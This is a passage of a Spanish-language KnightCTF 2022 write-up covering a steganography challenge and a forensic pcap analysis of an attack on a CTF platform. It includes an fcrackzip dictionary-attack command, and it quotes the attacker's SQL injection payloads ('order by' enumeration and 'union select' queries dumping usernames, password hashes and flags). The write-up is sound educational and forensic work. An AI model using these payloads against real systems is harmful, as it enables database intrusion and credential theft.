<p>Al abrir el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/interesting_waves.png">archivo adjunto</a> no vamos a observar nada relevante, no obstante, el nombre del reto nos da una pista bastante importante. Vamos a hacer uso de <code class="language-plaintext highlighter-rouge">binwalk</code>, una herramienta de <em>ingeniería inversa</em> dedicada a identificar archivos y código malicioso en <em>imágenes de firmware</em>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>binwalk -e interesting_waves.png
</code></pre></div></div>

<p>Se nos creará una carpeta dentro de la cual estará todo lo que se encontraba dentro de la imagen; entre ello, un archivo <code class="language-plaintext highlighter-rouge">.zip</code> protegido por contraseña.</p>

<p>En vista de que no tenemos ningún indicio de ninguna contraseña, aplicaremos fuerza bruta sobre el archivo <code class="language-plaintext highlighter-rouge">.zip</code> mediante <code class="language-plaintext highlighter-rouge">fcrackzip</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install fcrackzip
</code></pre></div></div>

<p>Para ello necesitaremos de algún diccionario, el más común es <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220209T031834Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&amp;X-Amz-SignedHeaders=host&amp;actor_id=79855501&amp;key_id=0&amp;repo_id=97553311&amp;response-content-disposition=attachment%3B%20filename%3Drockyou.txt&amp;response-content-type=application%2Foctet-stream">rockyou.txt</a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fcrackzip -D -p /ruta/del/diccionario/rockyou.txt -u 11150.zip
</code></pre></div></div>

<ul>
  <li>-D - Indicamos que queremos hacer un <code class="language-plaintext highlighter-rouge">ataque de diccionario</code></li>
  <li>-p - Indicamos el diccionario</li>
  <li>-u - Nos quedamos solamente con la contraseña correcta; descartamos falsos positivos</li>
</ul>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/38.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Ya con la contraseña del <code class="language-plaintext highlighter-rouge">.zip</code>, podemos extraer el archivo <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{BiNw4lk_is_h3lpfUl}
</code></pre></div></div>

<h3 id="networking"><a href="#header-3"></a>Networking</h3>

<h4 id="compromised-ctf-platform"><a href="#header-4"></a>Compromised CTF Platform</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/39.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Se nos da una <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/traffic.pcapng">captura de tráfico</a> que bien podemos analizar con <code class="language-plaintext highlighter-rouge">TShark</code> o <code class="language-plaintext highlighter-rouge">Wireshark</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/40.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>En este caso, como se nos pide averiguar por un nombre de usuario y contraseña, lo más sensato sería filtrar la captura por peticiones de tipo <code class="language-plaintext highlighter-rouge">POST</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http.request.method == POST
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/41.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Si empezamos a revisar cada petición, veremos que el atacante probó credenciales típicas como <em>admin/admin</em>, <em>admin/admin123</em>, <em>test/test</em>, <em>admin/password</em> devolviendo siempre el servidor un mensaje <code class="language-plaintext highlighter-rouge">Invalid Username or Password</code>, hasta que da con las credenciales correctas, <code class="language-plaintext highlighter-rouge">demo/demo</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{demo_demo}
</code></pre></div></div>

<h4 id="robotstxt"><a href="#header-4"></a>Robots.txt</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/42.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Como estamos en búsqueda del archivo <code class="language-plaintext highlighter-rouge">robots.txt</code>, podemos filtrar la <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/traffic.pcapng">captura de tráfico</a> por peticiones de tipo <code class="language-plaintext highlighter-rouge">GET</code>, y posteriormente por todas aquellas que mencionen el archivo que buscamos, esto último lo podemos hacer con <code class="language-plaintext highlighter-rouge">CTRL + F</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http.request.method == GET
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/43.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/44.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{/includes/users.php}
</code></pre></div></div>

<h4 id="php-version"><a href="#header-4"></a>PHP Version</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/45.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Este reto era bastante sencillo, podíamos completarlo a medida que realizábamos otros retos. La versión de PHP podemos visualizarla en cualquier petición que se realice al servidor.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/46.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{PHP/7.4.27}
</code></pre></div></div>

<h4 id="kctf"><a href="#header-4"></a>KCTF</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/47.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Para este reto no se nos da mayor contexto, sin embargo, si analizamos los objetos <code class="language-plaintext highlighter-rouge">HTTP</code> encontraremos una imagen que contiene la flag.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/48.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/49.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{Ev3rY_USEr_1nPuT_SH0uLD_B3_S4niT1z3D}
</code></pre></div></div>

<h4 id="admin-arena"><a href="#header-4"></a>Admin Arena</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/50.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Nuevamente tenemos que filtrar de la <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/traffic.pcapng">captura de tráfico</a>, información que viaja por <code class="language-plaintext highlighter-rouge">POST</code>, en este caso, en la ruta <code class="language-plaintext highlighter-rouge">Admin Arena</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http.request.method == POST
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/51.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{tareq@hackerzarena.com_P@$$w0Rd}
</code></pre></div></div>

<h4 id="vuln"><a href="#header-4"></a>Vuln</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/52.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>A partir de este punto, los retos van enfocados al ataque que se realizó en contra de la plataforma de CTF. Si hemos estado atentos a las diversas peticiones <code class="language-plaintext highlighter-rouge">HTTP</code> que se realizaron, nos habremos percatado que hay varias bastante sospechosas.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/53.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Ya viendo esto podríamos determinar el tipo de ataque que se realizó, <code class="language-plaintext highlighter-rouge">SQL Injection</code>, no obstante, al verse <em>url encodeado</em>, puede resultar un poco complicado leer la petición.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{sql_injection}
</code></pre></div></div>

<h4 id="vuln-columns"><a href="#header-4"></a>Vuln Columns</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/54.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Para visualizar de mejor manera las <em>inyecciones SQL</em> que se realizaron, podemos exportar los objetos <code class="language-plaintext highlighter-rouge">HTTP</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/48.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/55.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Si observamos detenidamente, nos daremos cuenta que el atacante empieza a <code class="language-plaintext highlighter-rouge">ordenar</code> las columnas de la base de datos de manera consecutiva, con el objetivo de conocer el total de columnas existentes.</p>

<p>Este proceso lo realiza un total de <em>diez veces</em>, en el primer intento hay un pequeño fallo de sintaxis por lo que lo descartamos, y a partir del segundo intento, empieza a <code class="language-plaintext highlighter-rouge">ordenar</code> las columnas, una a una, esto lo hace hasta la columna <em>nueve</em>, la cual no existe, razón por la cual, en el décimo intento, vuelve a <code class="language-plaintext highlighter-rouge">ordenar</code> las columnas hasta la número <code class="language-plaintext highlighter-rouge">ocho</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>users.php?id=1' order by 1,2,3,4,5,6,7,8 --+
</code></pre></div></div>

<p>Sabidas el número total de columnas de la base de datos, el atacante empieza a determinar cuales son <code class="language-plaintext highlighter-rouge">vulnerables</code>, esto lo hace a través del comando <code class="language-plaintext highlighter-rouge">union</code>, con el cual empieza a reemplazar ciertas columnas por otra serie de <em>comandos</em> que le otorgan <em>información relevante</em> de la base de datos.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>users.php?id=1' union select 1,2,3,4,5,6,7,8 --+
users.php?id=1' union select 1,2,version(),4,5,6,7,8 --+
</code></pre></div></div>

<p>Una vez analizadas las columnas que el atacante utiliza, podemos determinar que son <code class="language-plaintext highlighter-rouge">cuatro</code>, las columnas <code class="language-plaintext highlighter-rouge">vulnerables</code>; concretamente, las columnas <em>3</em>, <em>6</em>, <em>7</em> y <em>8</em>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{4}
</code></pre></div></div>

<h4 id="hashed-password"><a href="#header-4"></a>Hashed Password</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/56.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Para este reto se nos pregunta por el hash de la contraseña del usuario <code class="language-plaintext highlighter-rouge">tareq</code>, la cual el atacante consiguió haciendo uso de las <code class="language-plaintext highlighter-rouge">inyecciones SQL</code>, concretamente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>users.php?id=1' union select 1,2,3,group_concat(username,0x203a20,password),5,user(),7,8 from users --+
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/57.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{$2Y$10$XVKEZO/NKM4KE073CPTEG.VKFTHMH1CCDPRDD5JWYWKFEZ6GZKZN.}
</code></pre></div></div>

<h4 id="database-flag"><a href="#header-4"></a>Database Flag</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/58.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Al igual que el reto anterior, se pude asumir que el atacante a través de las <code class="language-plaintext highlighter-rouge">inyecciones SQL</code>, logró filtrar información relevante de la plataforma de CTF, en este caso una <em>flag</em>; la <em>inyección</em> en cuestión es:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>users.php?id=1' union select 1,2,3,4,5,6,group_concat(flag),8 from vulnerable --+
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/59.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Conseguimos filtrar dos cadenas encriptadas en <code class="language-plaintext highlighter-rouge">Base64</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>S0NURntTcUw=
XzFOajNDN2kwbn0=
</code></pre></div></div>

<p>Al <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)">desencriptarlas</a> conseguiremos la flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{SqL_1Nj3C7i0n}
</code></pre></div></div>

<h4 id="attacker"><a href="#header-4"></a>Attacker</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/60.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Finalmente, parece ser que el atacante decidió ‘firmar’ el ataque, dejando su nombre en la última <code class="language-plaintext highlighter-rouge">inyección SQL</code>, donde deja un mensaje encriptado en <code class="language-plaintext highlighter-rouge">hexadecimal</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>users.php?id=1' union select 1,2,0x4861636b6564204279204d4f5348,4,5,6,group_concat(flag),8 from vulnerable --+
</code></pre></div></div>

<p>No obstante, si no queremos <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('None')">desencriptar</a> el mensaje, podemos verlo en texto plano desde el propio <code class="language-plaintext highlighter-rouge">Wireshark</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/61.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

</article>

<div class="image-overlay" onclick="closeImage()"></div>
<img id="expandedImage" class="expanded-image">

<script>
function expandImage(img) {
  var expandedImg = document.getElementById("expandedImage");
  var overlay = document.querySelector(".image-overlay");

  expandedImg.src = img.src;

  overlay.style.display = "block";
  expandedImg.style.display = "block";

  document.addEventListener("keydown", handleEscKey);
}

function closeImage() {
  var expandedImg = document.getElementById("expandedImage");
  var overlay = document.querySelector(".image-overlay");

  overlay.style.display = "none";
  expandedImg.style.display = "none";

  document.removeEventListener("keydown", handleEscKey);
}

function handleEscKey(event) {
  if (event.key === "Escape" || event.key === "Esc") {
    closeImage();
  }
}
</script>

      </section>
    </div>
  </div>

  

  <footer>
  <a href="https://creativecommons.org/licenses/by-nc/4.0/">
    <span>
        <b>m4teo</b>
    </span>
    
    <span>© 2024</span>
  </a>
</footer>


  
    <script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-524F5BE8G5', 'auto');
  ga('send', 'pageview');
</script>
  

</body>
</html>
